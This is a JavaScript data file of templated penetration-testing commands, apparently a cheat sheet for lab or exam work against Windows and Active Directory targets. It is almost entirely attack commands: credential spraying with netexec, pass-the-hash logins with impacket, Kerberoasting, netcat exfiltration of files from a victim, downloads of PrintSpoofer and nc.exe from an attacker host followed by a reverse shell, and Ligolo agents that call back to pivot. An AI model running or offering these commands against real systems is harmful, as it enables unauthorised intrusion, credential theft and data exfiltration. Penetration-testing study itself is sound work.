export var commands = {
    "gen": {
        "Basic Full TCP Port nmap": "nmap -v -sT -sC -Pn -sV -p- {{RHOST}} -o nmap.txt",
        "Basic UDP Port nmap": "nmap -v -sU -sC -Pn --top-port=20 {{RHOST}} -o nmap_udp.txt",
        "Transfer File to victim (Powershell) ": "iwr http://{{LHOST}}:{{WEBPORT}}/{{LFILE}} -o {{LFILE}}",
        "Download File from victim (Netcat) - CMD ": "nc.exe {{LHOST}} {{LPORT}} -w 3 < {{RFILE}} \nnc -lnvp {{LPORT}} > {{LFILE}}",
        "Python tty": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    },
    "winenum": {
        "Enumerate using Winpeas": "./winpeas.exe",
        "Search for Credentials using winpeas": "./winpeas.exe credentials",
        "Search for files on the system": "Get-ChildItem -Path C:\\Users\\ -Include * -File -Recurse -ErrorAction SilentlyContinue"
    },
    "winnetexec": {
        "Netexec SMB - single domain credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec SMB - single domain hash": "netexec smb {{RHOST}} -u {{USERNAME}} -p {{NTLMHASH}}",
        "Netexec SMB - single local credentials": "netexec smb {{RHOST}} -u {{USERNAME}} -H {{PASSWORD}} --local-auth",
        "Netexec SMB - multiple targets, multiple domain credentials": "netexec smb target.txt -U username.txt -P passwords.txt --continue-on-success",
        "Netexec SMB - multiple targets, multiple domain credentials, no bruteforce": "netexec smb target.txt -U username.txt -P passwords.txt --no-bruteforce --continue-on-success",
        "Netexec WINRM - single domain credentials (see netexec SMB for more combination)": "netexec winrm {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec RDP - single domain credentials (see netexec SMB for more combination)": "netexec rdp {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
        "Netexec MSSQL - single domain credentials (see netexec SMB for more combination)": "netexec mssql {{RHOST}} -u {{USERNAME}} -p {{PASSWORD}}",
    },
    "wincon": {
        "Psexec Connection with password for domain": "impacket-psexec {{DOMAIN}}/{{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with password for local": "impacket-psexec {{USERNAME}}:\"{{PASSWORD}}\"@{{RHOST}}",
        "Psexec Connection with pass the hash": "impacket-psexec -hashes 00000000000000000000000000000000:{{NTLMHASH}} {{USERNAME}}@{{RHOST}}",
        "Wmiexec Connection with pass the hash": "impacket-wmiexec -hashes :{{NTLMHASH}} {{USERNAME}}@{{RHOST}}"
    },
    "winpot": {
        "Printspoofer privesc 1 - Upgrade to netcat shell later": "iwr http://{{LHOST}}:{{WEBPORT}}/PrintSpoofer64.exe -o /users/public/print.exe\n/users/public/print.exe -i -c powershell",
        "Printspoofer privesc 2 - Upgrade to netcat shell later": "iwr http://{{LHOST}}:{{WEBPORT}}/PrintSpoofer64.exe -o /users/public/print.exe\niwr http://{{LHOST}}:{{WEBPORT}}/nc.exe -o /users/public/nc.exe\n/users/public/print.exe -c '/users/public/nc.exe {{LHOST}} {{LPORT}} -e powershell'",
    },
    "adattack": {
        "AS-REP Roasting (ASREP)": "impacket-GetNPUsers -dc-ip {{DCIP}}  -request -outputfile hashes.asreproast {{DOMAIN}}/{{USERNAME}}",
        "Kerberoasting (Kerberos)": "impacket-GetUserSPNs -request -dc-ip {{DCIP}} {{DOMAIN}}/{{USERNAME}}",
        "DSYNC Attack": ""
    },
    "ligpivot": {
        "Setup Ligolo on Kali": "sudo ip tuntap add user [your username] mode tun ligolo\nsudo ip link set ligolo up",
        "Start Ligolo": "ligolo-proxy -selfcert 0.0.0.0:11601",
        "Pivot on Linux": "wget http://{{LHOST}}:{{WEBPORT}}/agent -O /tmp/agent\nchmod +x /tmp/agent\n/tmp/agent -connect {{LHOST}}:11601 -ignore-cert",
        "Pivot on Windows (Powershell)": "iwr http://{{LHOST}}:{{WEBPORT}}/ligoloagentx64.exe -o /users/public/agent.exe\n/users/public/agent.exe -connect {{LHOST}}:11601 -ignore-cert"
    }

}
